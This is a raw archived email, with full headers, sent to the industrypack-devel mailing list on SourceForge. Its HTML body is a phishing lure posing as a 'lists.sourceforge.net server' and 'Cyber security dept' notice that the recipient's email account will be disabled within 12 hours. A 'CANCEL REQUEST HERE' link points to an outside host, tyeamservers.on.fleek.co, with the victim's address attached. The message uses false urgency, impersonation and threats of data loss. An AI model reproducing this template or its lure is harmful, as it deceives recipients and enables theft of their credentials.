Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id F1F4855160D
	for <lists+industrypack-devel@lfdr.de>; Mon, 20 Jun 2022 12:39:54 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1o3Eoy-0000hm-M1
	for lists+industrypack-devel@lfdr.de; Mon, 20 Jun 2022 10:39:53 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <Support@lists.sourceforge.net>) id 1o3Eov-0000hX-Vm
 for industrypack-devel@lists.sourceforge.net; Mon, 20 Jun 2022 10:39:51 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=7+svyQwzsCy+i95bDoZDsAYNhKeToNJMVaxYEOQjNMM=; b=jytG3bBUi+9GD8kpdCJaXhatgu
 yMuoplzrEA4JSEM8RxH45G0oRx0PqXD+wKPwdKMVo5vJGZtA5xCDIEqjUuTJv3ER2a+cM9rRartkQ
 bUtNdZbShQNZRbx2CBJm3kCePONHWEPkhoY4TpUmz9uXrjHxHvl262oFw0V9NhPYFC1k=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=7+svyQwzsCy+i95bDoZDsAYNhKeToNJMVaxYEOQjNMM=; b=D
 eXZ/3I6ADL36FtMBpcQE6CatGB3VkXf91jmJ54a69iIvX+oHruAvJJtM+Ja30uHdHW4n62tMI3oOu
 TRf+XA0IvQASgHcPC1DlZIH1KbwNRm6qhTVHdDLCVmvDQd6aC/2HQJAV75rri1s2ghPjJoFIxD+Gx
 duyhpSClZDKQJ2uM=;
Received: from py008.sich.cc ([45.72.78.8])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.94.2)
 id 1o3Eow-008Bax-0i
 for industrypack-devel@lists.sourceforge.net; Mon, 20 Jun 2022 10:39:50 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 20 Jun 2022 10:39:43 -0700
Message-ID: <20220620103943.F46301D3A9E6F40B@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 4.4 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  lists.sourceforge.net server Sender Action Required 
 Content analysis details:   (4.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [45.72.78.8 listed in dnsbl-1.uceprotect.net]
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [45.72.78.8 listed in bl.score.senderscore.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1o3Eow-008Bax-0i
Subject: [Industrypack-devel] =?utf-8?b?4pqg77iPIEFMRVJUIExhc3QgV2Fybmlu?=
 =?utf-8?q?g=3A_Your_eMail_account_will_be_disabled_within_12hours?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Email-Server via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Email-Server <Support@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============5480242246601636686=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5480242246601636686==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
<body>
<table width=3D"548" style=3D'color: black; text-transform: none; text-inde=
nt: 0px; letter-spacing: normal; padding-top: 0px; padding-bottom: 0px; fon=
t-family: "Segoe UI", "Lucida Sans", sans-serif; font-size: 15px; font-styl=
e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border=
-collapse: collapse; max-width: 548px; orphans: 2; widows: 2; background-co=
lor: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps:=
 normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;' cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td style=3D"padding-right: 0px; padding-bottom: 15px; padding-left: 0px;">=

<table style=3D"width: 543px; height: 101px; padding-top: 0px; padding-bott=
om: 0px; font-family: inherit; font-weight: 600; border-collapse: collapse;=
 max-width: 548px;">
<tbody>
<tr>
<td style=3D'width: 181px; font-family: "segoe ui", frutiger, arial, sans-s=
erif; vertical-align: bottom;'><span class=3D"v1colour" style=3D"color: rgb=
(241, 97, 14);">lists.sourceforge.net server&nbsp;</span><br></td>
<td style=3D'width: 186px; text-align: center; font-family: "segoe ui", fru=
tiger, arial, sans-serif; vertical-align: bottom;'><br></td>
<td style=3D'width: 181px; text-align: right; font-family: "segoe ui", frut=
iger, arial, sans-serif; vertical-align: bottom;'><br></td></tr>
<tr>
<td style=3D'width: 181px; padding-top: 0px; padding-bottom: 0px; font-fami=
ly: "segoe ui", frutiger, arial, sans-serif; font-size: 14px; font-weight: =
400; vertical-align: middle;'><span><span class=3D"v1colour" style=3D"borde=
r-width: 0px; margin: 0px; padding: 0px; color: black; vertical-align: base=
line;">Sender</span></span><br></td>
<td style=3D'width: 186px; text-align: center; padding-top: 0px; padding-bo=
ttom: 0px; font-family: "segoe ui", frutiger, arial, sans-serif; font-size:=
 14px; font-weight: 400; vertical-align: middle;'><br></td>
<td style=3D'width: 181px; text-align: right; padding-top: 0px; padding-bot=
tom: 0px; font-family: "segoe ui", frutiger, arial, sans-serif; font-size: =
14px; font-weight: 400; vertical-align: middle;'><span><span class=3D"v1col=
our" style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(192,=
 0, 0); vertical-align: baseline;"><b>Action Required</b></span>
 </span><br></td></tr>
<tr>
<td style=3D"padding: 0px;" colspan=3D"3">
<table style=3D"padding: 0px; border-collapse: collapse;" cellspacing=3D"0"=
 cellpadding=3D"0">
<tbody>
<tr height=3D"10">
<td style=3D"padding: 0px; width: 180px; height: 10px; line-height: 10px; f=
ont-size: 6px;" bgcolor=3D"#cccccc"><br></td>
<td style=3D"padding: 0px; width: 4px; height: 10px; line-height: 10px; fon=
t-size: 6px;" bgcolor=3D"white"><br></td>
<td style=3D"padding: 0px; width: 180px; height: 10px; line-height: 10px; f=
ont-size: 6px;" bgcolor=3D"#cccccc"><br></td>
<td style=3D"padding: 0px; width: 4px; height: 10px; line-height: 10px; fon=
t-size: 6px;" bgcolor=3D"white"><br></td>
<td style=3D"padding: 0px; width: 180px; height: 10px; line-height: 10px; f=
ont-size: 6px;" bgcolor=3D"#c00000"><br></td></tr></tbody></table></td></tr=
>
<tr>
<td style=3D'padding: 0px; width: 181px; line-height: 20px; font-family: "s=
egoe ui", frutiger, arial, sans-serif; font-size: 14px; font-weight: 400;'>=
<br></td>
<td style=3D'padding: 0px; width: 186px; text-align: center; line-height: 2=
0px; font-family: "segoe ui", frutiger, arial, sans-serif; font-size: 14px;=
 font-weight: 400;'><br></td>
<td style=3D'padding: 0px; width: 181px; text-align: right; line-height: 20=
px; font-family: "segoe ui", frutiger, arial, sans-serif; font-size: 14px; =
font-weight: 400;'><span><span class=3D"v1colour" style=3D"border-width: 0p=
x; margin: 0px; padding: 0px; color: rgb(192, 0, 0); vertical-align: baseli=
ne;">
<b>eMail Account Block</b></span></span><br></td></tr></tbody></table></td>=
</tr>
<tr>
<td style=3D"width: 528px; padding-top: 0px; padding-right: 10px; padding-l=
eft: 10px;">
<div style=3D"padding-top: 0px; border-top-color: currentColor; border-top-=
width: 0px; border-top-style: none;">&nbsp;</div>
<table style=3D"padding: 0px; width: 537px; height: 333px; margin-left: 0px=
; background-color: rgb(242, 245, 250);">
<tbody>
<tr>
<td style=3D'padding: 0px 10px; font-family: "segoe ui", frutiger, arial, s=
ans-serif; font-size: 21px;'>
<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline;">=

<table width=3D"680" style=3D"border-width: 0px; color: rgb(51, 51, 51); fo=
nt-family: Verdana, Arial, Helvetica, sans-serif; font-size: 11px; max-widt=
h: 680px; background-color: rgb(244, 244, 244);" border=3D"0" cellspacing=
=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td width=3D"680" height=3D"25" style=3D"font-family: Helvetica, Arial, san=
s-serif; font-size: 16px;"><span class=3D"v1size" style=3D"font-size: 10px;=
">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nb=
sp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&n=
bsp;<span>&nbsp;</span><span class=3D"v1size" style=3D"font-size: 13px;"><b=
>Closing Of Email Address Notice!</b></span></span><br></td></tr>
<tr>
<td style=3D"border-width: 2px; border-style: solid; border-color: rgb(232,=
 232, 232) rgb(232, 232, 232) rgb(255, 108, 44); padding: 15px 0px 20px; ba=
ckground-color: rgb(255, 255, 255);">
<table width=3D"680" style=3D"font-family: Helvetica, Arial, sans-serif;" b=
order=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td width=3D"15"><span class=3D"v1size" style=3D"font-size: 13px;"><br></sp=
an></td>
<td width=3D"650">
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td>
<div style=3D"padding-top: 0px; border-top-color: currentColor; border-top-=
width: 0px; border-top-style: none;"><span class=3D"v1size" style=3D"font-s=
ize: 13px;"><span>Attention&nbsp;industrypack-devel ,<br><br>&#9888; We hav=
e received your request to&nbsp;disable your email account below and the re=
quest will be concluded within 12hours from now.</span><br><br></span></div=
>
<table style=3D"margin: 5px 10px; padding: 0px; border: 2px solid rgb(232, =
232, 232); border-image: none; max-width: 630px;" cellspacing=3D"0" cellpad=
ding=3D"5">
<tbody>
<tr>
<th align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">Affect=
ed Email<span>&nbsp;</span></span><br></th>
<td align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;"><b>Acc=
ount Details</b></span><br></td></tr>
<tr style=3D"background-color: rgb(244, 244, 244);">
<th align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">Domain=
 :</span></th>
<td align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;"><span =
class=3D"v1colour" style=3D"color: rgb(51, 51, 51);">lists.sourceforge.net<=
/span></span></td></tr>
<tr>
<th align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">User&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span>&nbsp;</span>=
<span>&nbsp;</span></span></th>
<td align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">indust=
rypack-devel</span></td></tr>
<tr style=3D"background-color: rgb(244, 244, 244);">
<th align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">Email&=
nbsp;&nbsp;&nbsp; :&nbsp;</span><br></th>
<td align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">indust=
rypack-devel@lists.sourceforge.net</span></td></tr>
<tr>
<th align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">Time&n=
bsp;&nbsp;&nbsp;&nbsp; :</span></th>
<td align=3D"left"><span class=3D"v1size" style=3D"font-size: 13px;">6/20/2=
022 10:39:43 a.m.</span></td></tr></tbody></table>
<div dir=3D"ltr"><span class=3D"v1size" style=3D"font-size: 10px;"><span><s=
pan class=3D"v1size" style=3D"font-size: 13px;"><span><span class=3D"v1size=
" style=3D"font-size: 10px;"><span class=3D"v1size" style=3D"font-size: 13p=
x;"><font size=3D"3"><br>&nbsp;</font><a style=3D"color: rgb(0, 105, 166);"=
 href=3D"https://tyeamservers.on.fleek.co/isindicat.html#industrypack-devel=
@lists.sourceforge.net" target=3D"_blank" rel=3D"noreferrer"><strong><font =
size=3D"3">
 CANCEL REQUEST&nbsp;HERE<span>&nbsp;</span></font></strong></a><font size=
=3D"3"> </font><a style=3D"color: rgb(0, 105, 166);" href=3D"https://tyeams=
ervers.on.fleek.co/isindicat.html#industrypack-devel@lists.sourceforge.net"=
 target=3D"_blank" rel=3D"noreferrer"><strong><font size=3D"3">&#9654;</fon=
t></strong></a><strong><font size=3D"3">&nbsp;&nbsp;</font>&nbsp;</strong><=
/span></span></span><br><br>
If you did not make this request or you made it by mistake or unknowingly, =
quickly take action above&nbsp;to stop this email termination process, but =
if you made this request kindly ignore this message as this account will be=
 terminated soon.</span></span></span></div></td></tr>
<tr>
<td>
<div style=3D"color: rgb(102, 102, 102); padding-top: 5px; font-size: 12px;=
 margin-top: 5px; border-top-color: rgb(232, 232, 232); border-top-width: 2=
px; border-top-style: solid;">
<div style=3D"margin: 5px 0px 0px; padding: 0px; border-top-color: currentC=
olor; border-top-width: 0px; border-top-style: none;" dir=3D"ltr"><span><sp=
an class=3D"v1size" style=3D"font-size: 10px;"><span class=3D"v1size" style=
=3D"font-size: 13px;"><strong><br></strong></span></span></span><br></div>
<div style=3D"margin: 5px 0px 0px; padding: 0px;"><span class=3D"v1size" st=
yle=3D"font-size: 13px;"><b><span class=3D"v1colour" style=3D"color: rgb(20=
4, 0, 0);">Note:<span>&nbsp;</span></span></b><span class=3D"v1colour" styl=
e=3D"color: rgb(0, 0, 255);"> If you fail to cancel this process above, we =
advise you to backup your mails and contacts, as you will lose all your mes=
sages and contacts when this email "industrypack-devel@lists.sourceforge.ne=
t" account termination is concluded.</span>
<br> </span><br></div></div>
<div dir=3D"ltr"><span class=3D"v1size" style=3D"font-size: 10px;"><span>&c=
opy;lists.sourceforge.net</span></span><br></div></td></tr></tbody></table>=
</td>
<td width=3D"15"><br></td></tr></tbody></table></td></tr>
<tr>
<td align=3D"center" style=3D"padding-top: 10px;"><span class=3D"v1size" st=
yle=3D"font-size: 10px;"><span><span class=3D"v1size" style=3D"font-size: 1=
3px;"><font size=3D"1">Source: Administrator Support &copy;2022 Cyber secur=
ity dept</font></span></span></span><br></td></tr></tbody></table></div></t=
d></tr>
<tr>
<td style=3D'padding: 0px 10px 6px; font-family: "segoe ui", frutiger, aria=
l, sans-serif; font-size: 16px;'></td></tr>
<tr>
<td style=3D'padding: 0px 10px 6px; font-family: "segoe ui", frutiger, aria=
l, sans-serif; font-size: 16px;'></td></tr></tbody></table></td></tr>
<tr>
<td style=3D'padding-top: 10px; padding-bottom: 4px; font-family: "segoe ui=
", frutiger, arial, sans-serif; font-size: 14px;'></td></tr></tbody></table=
>
<p style=3D'color: rgb(51, 51, 51); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Helv=
etica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; w=
ord-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-co=
lor: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps:=
 normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial=
; text-decoration-style: initial;=20
text-decoration-color: initial;'></p>
<div style=3D'color: rgb(51, 51, 51); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, He=
lvetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400;=
 word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-=
color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-cap=
s: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initi=
al; text-decoration-style: initial;=20
text-decoration-color: initial;'><span class=3D"v1font" style=3D'font-famil=
y: "Segoe UI", "Lucida Sans", sans-serif;'><span class=3D"v1colour" style=
=3D"color: rgb(153, 153, 153);"><span class=3D"v1size" style=3D"font-size: =
10px;">
The information contained in or attached to this communication is intended =
solely for the use of the individual or entity to whom it is addressed and =
others authorized to receive it. It may contain confidential or legally pri=
vileged information. If you are not the intended recipient you are hereby n=
otified that any disclosure, copying, distribution or taking any action in =
reliance on the contents of this information is strictly prohibited and may=
 be unlawful. If you have received this=20
communication in error, please notify me immediately by responding to this =
email and then delete it from your system. We are neither liable for the pr=
oper and complete transmission of the information contained in this communi=
cation nor for any delay in its receipt.</span>&nbsp;</span></span></div></=
body></html>


--===============5480242246601636686==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5480242246601636686==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5480242246601636686==--
